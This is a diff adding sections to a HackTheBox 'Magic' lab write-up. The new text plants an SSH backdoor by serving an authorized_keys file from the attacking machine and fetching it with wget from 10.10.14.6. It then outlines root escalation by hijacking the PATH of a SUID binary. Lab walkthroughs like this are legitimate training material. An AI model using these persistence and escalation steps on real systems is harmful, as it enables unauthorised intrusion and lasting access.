@@ -85,7 +85,41 @@ Running the following code will iterate the tables in the database. We run into 
 ```
 su theseus
 ```
-
 We are now able to grab the user.txt file in the homefolder of theseus.
 
+
+# Persistent Access
+For a more persistent access to the target we'll setup SSH by making a RSA keypair. On attacking machine:
+```
+ssh-keygen
+mv id_rsa.pub authorized_keys
+python -m SimpleHTTPServer 8000
+```
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Magic/assets/11.png">
+
+Now download the keys on the target:
+```
+wget http://10.10.14.6:8000/authorized_keys
+```
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Magic/assets/12.png">
+
+We have now added our public key to the authorized_Keys of ```theseus``` and are able to connect with SSH to our target.
+
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Magic/assets/13.png">
+
 # Privilege Escalation
+We'll now repeat our previous steps to discover anything usefull. We find an interesting binary that has the SUID set.
+
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Magic/assets/14.png">
+
+Running ```strings``` on the binary shows us that ```lhsw``` and ```fdisk``` are being run. We can change the execute path of the binary and create one of our one to get a shell with root privileges.
+
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Magic/assets/15.png">
+
+
+
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Magic/assets/16.png">
+
+
+
+
